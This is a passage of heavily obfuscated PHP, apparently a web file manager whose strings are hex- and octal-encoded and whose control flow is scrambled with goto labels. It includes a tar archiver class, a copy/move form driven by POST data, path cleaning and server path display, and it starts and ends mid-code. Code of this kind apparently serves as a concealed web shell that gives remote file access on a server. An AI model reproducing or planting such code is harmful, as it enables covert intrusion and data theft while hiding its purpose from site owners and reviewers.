    <?php  } goto Cf19T; T5KaI: if (!defined("\106\115\137\x53\x45\123\123\x49\117\x4e\x5f\x49\x44")) { define("\106\x4d\x5f\123\x45\x53\123\x49\117\x4e\x5f\111\x44", "\x66\x69\154\x65\155\x61\156\141\147\x65\x72"); } goto tly6X; Rzv8n: $ik = 6070; goto g0FBu; X_FTZ: defined("\106\115\137\110\x49\x47\x48\x4c\111\107\110\124\x4a\x53\x5f\123\x54\x59\x4c\105") || define("\x46\115\137\110\x49\x47\x48\114\x49\107\x48\124\112\x53\x5f\x53\124\131\x4c\x45", $highlightjs_style); goto vuqjc; UWFP8: $datetime_format = "\x64\x2e\155\56\x79\40\x48\x3a\151"; goto qqiIN; xno2s: $root_path = rtrim($root_path, "\x5c\57"); goto CpW9N; tw0by: $tableTheme = FM_THEME == "\x64\x61\x72\153" ? "\164\x65\170\x74\55\167\x68\151\x74\145\40\142\x67\x2d\x64\141\x72\153\x20\164\141\x62\154\x65\55\144\x61\162\x6b" : "\x62\x67\x2d\x77\150\151\x74\145"; goto riVzX; ViG09: function fm_get_onlineViewer_exts() { return array("\144\157\143", "\144\x6f\143\170", "\x78\x6c\x73", "\x78\x6c\163\x78", "\160\144\x66", "\160\x70\164", "\160\x70\x74\x78", "\141\x69", "\160\163\x64", "\x64\x78\x66", "\x78\160\163", "\x72\x61\x72", "\x6f\144\x74", "\157\144\163"); } goto MUgyO; Gh3ci: function fm_clean_path($path, $trim = true) { $path = $trim ? trim($path) : $path; $path = trim($path, "\x5c\57"); $path = str_replace(array("\x2e\x2e\x2f", "\56\56\x5c"), '', $path); $path = get_absolute_path($path); if ($path == "\x2e\56") { $path = ''; } return str_replace("\x5c", "\x2f", $path); } goto EsgZ_; ivbU5: $allowed_upload_extensions = ''; goto wWfT4; uCoBm: if (!FM_IS_WIN && !$hide_Cols) { ?>
                        <th><?php  echo lng("\120\x65\x72\155\163"); ?>
</th>
                        <th><?php  echo lng("\x4f\x77\x6e\x65\162"); ?>
</th><?php  } goto zjtZN; n2Cqs: ?>
">
        <input type="hidden" name="group" value="1">
        <div class="table-responsive">
            <table class="table table-bordered table-hover table-sm <?php  goto skTge; ZR0jF: class FM_Zipper_Tar { private $tar; public function __construct() { $this->tar = null; } public function create($filename, $files) { $this->tar = new PharData($filename); if (is_array($files)) { foreach ($files as $f) { if (!$this->addFileOrDir($f)) { return false; } } return true; } else { if ($this->addFileOrDir($files)) { return true; } return false; } } public function unzip($filename, $path) { $res = $this->tar->open($filename); if ($res !== true) { return false; } if ($this->tar->extractTo($path)) { return true; } return false; } private function addFileOrDir($filename) { if (is_file($filename)) { try { $this->tar->addFile($filename); return true; } catch (Exception $e) { return false; } } elseif (is_dir($filename)) { return $this->addDir($filename); } return false; } private function addDir($path) { $objects = scandir($path); if (is_array($objects)) { foreach ($objects as $file) { if ($file != "\56" && $file != "\56\x2e") { if (is_dir($path . "\57" . $file)) { if (!$this->addDir($path . "\57" . $file)) { return false; } } elseif (is_file($path . "\x2f" . $file)) { try { $this->tar->addFile($path . "\57" . $file); } catch (Exception $e) { return false; } } } } return true; } return false; } } goto mBcx7; oxVn5: if (isset($_POST["\143\157\160\171"]) && !FM_READONLY) { $copy_files = isset($_POST["\146\x69\x6c\145"]) ? $_POST["\x66\x69\x6c\x65"] : null; if (!is_array($copy_files) || empty($copy_files)) { fm_set_msg(lng("\116\x6f\164\150\x69\x6e\x67\x20\163\x65\154\145\143\x74\x65\144"), "\x61\x6c\145\162\x74"); fm_redirect(FM_SELF_URL . "\x3f\160\75" . urlencode(FM_PATH)); } fm_show_header(); fm_show_nav_path(FM_PATH); ?>
    <div class="path">
        <div class="card <?php  echo fm_get_theme(); ?>
">
            <div class="card-header">
                <h6><?php  echo lng("\x43\157\x70\x79\151\x6e\x67"); ?>
</h6>
            </div>
            <div class="card-body">
                <form action="" method="post">
                    <input type="hidden" name="p" value="<?php  echo fm_enc(FM_PATH); ?>
">
                    <input type="hidden" name="finish" value="1">
                    <?php  foreach ($copy_files as $cf) { echo "\74\151\156\160\x75\x74\x20\164\171\160\145\x3d\42\150\x69\x64\144\x65\156\42\x20\x6e\x61\x6d\145\x3d\x22\146\x69\x6c\x65\x5b\x5d\42\x20\166\141\154\x75\x65\x3d\42" . fm_enc($cf) . "\42\x3e" . PHP_EOL; } ?>
                    <p class="break-word"><?php  echo lng("\106\151\154\145\x73"); ?>
: <b><?php  echo implode("\x3c\57\x62\x3e\54\40\x3c\x62\76", $copy_files); ?>
</b></p>
                    <p class="break-word"><?php  echo lng("\x53\157\x75\x72\143\x65\106\157\x6c\x64\x65\x72"); ?>
: <?php  echo fm_enc(fm_convert_win(FM_ROOT_PATH . "\x2f" . FM_PATH)); ?>
<br>
                        <label for="inp_copy_to"><?php  echo lng("\x44\x65\x73\164\x69\156\x61\164\x69\157\x6e\x46\157\154\144\145\162"); ?>
:</label>
                        <?php  echo FM_ROOT_PATH; ?>
/<input type="text" name="copy_to" id="inp_copy_to" value="<?php  echo fm_enc(FM_PATH); ?>
">
                    </p>
                    <p class="custom-checkbox custom-control"><input type="checkbox" name="move" value="1" id="js-move-files" class="custom-control-input"><label for="js-move-files" class="custom-control-label" style="vertical-align: sub"> <?php  echo lng("\x4d\x6f\166\145"); ?>
</label></p>
                    <p>
                        <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php  echo lng("\103\157\160\x79"); ?>
</button> &nbsp;
                        <b><a href="?p=<?php  echo urlencode(FM_PATH); ?>
" class="btn btn-outline-primary"><i class="fa fa-times-circle"></i> <?php  echo lng("\103\141\x6e\143\145\x6c"); ?>
</a></b>
                    </p>
                </form>
            </div>
        </div>
    </div>
    <?php  fm_show_footer(); die; } goto uo76i; De86c: defined("\x46\x4d\x5f\125\x53\105\x5f\110\111\107\x48\114\x49\x47\110\124\112\x53") || define("\106\x4d\x5f\x55\123\x45\x5f\x48\111\x47\110\114\111\x47\x48\x54\112\123", $use_highlightjs); goto X_FTZ; kczpk: ?>
</th>
                    <th><?php  goto lm3KI; tiCv2: $is_https = isset($_SERVER["\110\124\124\120\123"]) && ($_SERVER["\110\x54\x54\120\123"] == "\157\x6e" || $_SERVER["\110\124\124\120\x53"] == 1) || isset($_SERVER["\110\124\124\120\x5f\130\137\x46\x4f\x52\x57\x41\122\x44\x45\104\137\120\122\117\x54\x4f"]) && $_SERVER["\x48\124\124\120\137\x58\x5f\x46\x4f\x52\x57\x41\122\104\105\104\x5f\x50\122\x4f\x54\x4f"] == "\150\x74\x74\x70\163"; goto GyNAs; fCFub: function fm_get_filesize($size) { $size = (double) $size; $units = array("\x42", "\113\x42", "\115\x42", "\x47\102", "\124\102", "\120\x42", "\x45\x42", "\x5a\x42", "\x59\x42"); $power = $size > 0 ? floor(log($size, 1024)) : 0; return sprintf("\45\163\40\45\x73", round($size / pow(1024, $power), 2), $units[$power]); } goto UozNB; PaL1A: ')); ?>